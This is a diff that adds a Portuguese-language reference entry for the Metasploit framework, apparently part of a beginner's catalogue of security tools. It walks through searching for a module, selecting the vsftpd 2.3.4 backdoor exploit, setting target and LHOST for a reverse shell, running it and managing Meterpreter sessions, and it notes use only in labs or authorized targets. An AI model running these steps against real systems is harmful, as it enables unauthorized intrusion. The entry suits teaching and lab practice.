@@ -1,0 +1,43 @@
+NOME="metasploit"
+CATEGORIA="Framework de exploração"
+ALIASES="msfconsole msf"
+DESC="Framework completo para encontrar, configurar e executar módulos de exploração, auxiliares e de pós-exploração. É a ferramenta central para transformar uma vulnerabilidade identificada em acesso, de forma guiada."
+EXEMPLO='msfconsole -q -x "use <modulo>; set RHOSTS <alvo>; run"'
+PASSOS="- msfconsole: abre o console interativo do Metasploit
+- -q: modo quieto (sem o banner)
+- -x \"...\": executa esses comandos automaticamente ao abrir
+- use <modulo>: seleciona um módulo (ex.: exploit/unix/ftp/vsftpd_234_backdoor)
+- set RHOSTS <alvo>: define o host alvo
+- run (ou exploit): executa o módulo"
+FLUXO="0) (uma vez) inicie o banco de dados para guardar resultados:
+\$ sudo msfdb init
+1) Abra o console:
+\$ msfconsole -q
+2) Procure um módulo para o serviço/CVE que você achou no recon:
+   msf6 > search vsftpd 2.3.4
+   (também: search cve:2021-44228, search type:exploit name:smb)
+3) Selecione o módulo pelo nome ou pelo número da lista:
+   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+4) Veja o que precisa ser configurado:
+   msf6 exploit(...) > show options
+   (campos com 'yes' em Required são obrigatórios)
+5) Configure alvo e, se for um exploit remoto, o payload/sua escuta:
+   msf6 exploit(...) > set RHOSTS <alvo>
+   msf6 exploit(...) > set RPORT 21
+   msf6 exploit(...) > set LHOST <seu-ip>     (para onde a shell volta)
+   msf6 exploit(...) > set PAYLOAD <payload>  (se aplicável)
+6) (opcional) confira se o alvo parece vulnerável antes de atacar:
+   msf6 exploit(...) > check
+7) Execute:
+   msf6 exploit(...) > exploit
+8) Se der certo, você ganha uma sessão. Gerencie as sessões:
+   msf6 > sessions          (lista as sessões abertas)
+   msf6 > sessions -i 1     (interage com a sessão 1)
+   - De uma shell comum para Meterpreter, use o módulo shell_to_meterpreter.
+   - Em Meterpreter: 'sysinfo', 'getuid', 'help' mostram o que dá para fazer."
+DICA="Dentro do console, 'search' acha módulos, 'info' explica um módulo e 'show options'
+lista o que configurar. Erro comum nº1 de iniciante: esquecer de setar LHOST (payloads
+reversos precisam saber para onde voltar) ou RHOSTS, e o módulo falha sem acesso.
+Use 'setg' para variáveis globais que valem em todos os módulos. Importante: use
+apenas em laboratórios (ex.: Metasploitable, HTB, TryHackMe) ou alvos autorizados."
+VER_TAMBEM="searchsploit (exploits avulsos), nmap (recon de versões), nuclei (triagem de CVEs)"
